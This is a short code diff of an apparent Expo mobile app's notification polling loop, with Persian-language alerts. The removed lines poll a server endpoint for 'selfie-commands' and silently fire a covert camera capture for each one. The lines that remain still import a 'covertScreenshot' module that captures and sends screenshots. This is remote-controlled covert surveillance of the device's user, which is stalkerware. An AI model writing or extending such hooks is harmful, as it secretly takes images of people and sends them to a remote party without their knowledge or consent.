@@ -1,6 +1,5 @@
 import * as Notifications from 'expo-notifications';
 import { request } from './api';
-import { triggerCovertSelfie } from './covertTrigger';
 import { captureAndSendScreenshot } from './covertScreenshot';
 import { playSound, soundKeyByNotification, notificationSoundNameByType } from './soundFx';
 
@@ -74,16 +73,6 @@ async function tick() {
     if (!primedMsg) primedMsg = true;
     else for (const m of freshMsgs.slice(0, 5))
       await notify('پیام جدید', m.title ? `${m.title}` : 'شما یک پیام جدید دارید', { type: 'message', message_id: m.id });
-  } catch (e) {}
-
-  try {
-    const cmds = await request('/my/selfie-commands');
-    for (const cmd of (cmds || [])) {
-      if (!seenIds.has('cmd:'+cmd.id)) {
-        seenIds.add('cmd:'+cmd.id);
-        if (primed) triggerCovertSelfie('manual');
-      }
-    }
   } catch (e) {}
 
   try {
